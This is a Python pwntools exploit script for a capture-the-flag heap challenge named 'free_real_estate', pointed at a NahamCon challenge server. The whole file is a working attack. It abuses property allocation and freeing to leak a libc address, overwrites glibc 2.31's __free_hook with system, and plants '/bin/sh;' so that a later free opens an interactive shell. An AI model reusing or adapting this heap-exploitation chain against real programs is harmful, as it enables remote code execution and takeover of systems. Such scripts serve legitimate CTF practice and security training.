#!/usr/bin/env python3

from pwn import *

exe = ELF("./free_real_estate_patched")
libc = ELF("/lib/x86_64-linux-gnu/libc-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r

#r = conn()
r = remote("challenge.nahamcon.com", 30621)

def sl(a, b):
    r.sendlineafter(a, b)

def send_name(name):
    r.sendlineafter("Enter your name: ", name)

def alloc_property(street_size, street, price, comment=b""):
    sl("> ", "2")
    sl("Enter the house number: ", "1")
    sl("What is the length of the street name: ", str(street_size))
    sl("Enter the street name: ", street)
    sl("What is the price of the property?: ", str(price))

    if comment:
        sl("Would you like to add a comment for this property? [y/n]: ", "y")
        sl("What is the length of the comment?: ", str(len(comment ) + 1))
        sl("Enter the comment: ", comment)
    else:
        sl("Would you like to add a comment for this property? [y/n]: ", "n")

def free_property():
    sl("> ", "3")

def change_comment(comment):
    sl("> ", "4")
    for i in range(3):
        sl("[y/n]: ", "n")
    sl("[y/n]: ", "y")
    sl("Enter the new comment length: ", str(len(comment) + 1))
    sl("Enter the new comment: ", comment)


def change_name(name):
    sl("> ", "5")
    sl("What is the length of your new name?: ", str(len(name) + 1))
    sl("Enter your new name: ", name)

def reset_name():
    sl("> ", "5")
    sl("hat is the length of your new name?: ", "0")

def show():
    sl("> ", "1")


def change_street(street):
    sl("> ", "4")
    sl("[y/n]: ", "n")
    sl("[y/n]: ", "y")
    sl("nter the new street name length: ", str(len(street) + 1))
    sl("Enter the new street name: ", street)
    
    for i in range(2):
        sl("[y/n]: ", "n")

def main():
    send_name("MAHER")
    
    
    alloc_property(100, "HJERDRIANE", 100, b"A"*0x500)
    change_name(b"A"*0x1000)
    free_property() 
    alloc_property(100, "HJERDRIANE", 0x48, b"")
    show()
    r.recvuntil("Comment: ")
    libc_leak = u64(r.recv(6).ljust(8, p8(0)))
    log.warn("Libc leak @ 0x%x", libc_leak)
    change_name(b"A"*0x2000)
    free_property()
    alloc_property(100, "HJERDRIANE", 100, b"A"*0x108)
    change_name(b"M"*0x2100)
    change_comment(b"A"*0x10)
    free_property()
    alloc_property(100, "HJERDRIANE", 100, b"")


    libc.address = libc_leak - 0x1ecbe0
    log.warn("Libc base @ 0x%x", libc.address)

    change_comment(p64(libc.sym.__free_hook)*2)
    change_street(b"/bin/sh;" + b"A"*270) 
    reset_name()
    change_name(p64(libc.sym.system) + b"A"*(270))
    sl("> ", '3')
    r.interactive()


if __name__ == "__main__":
    main()
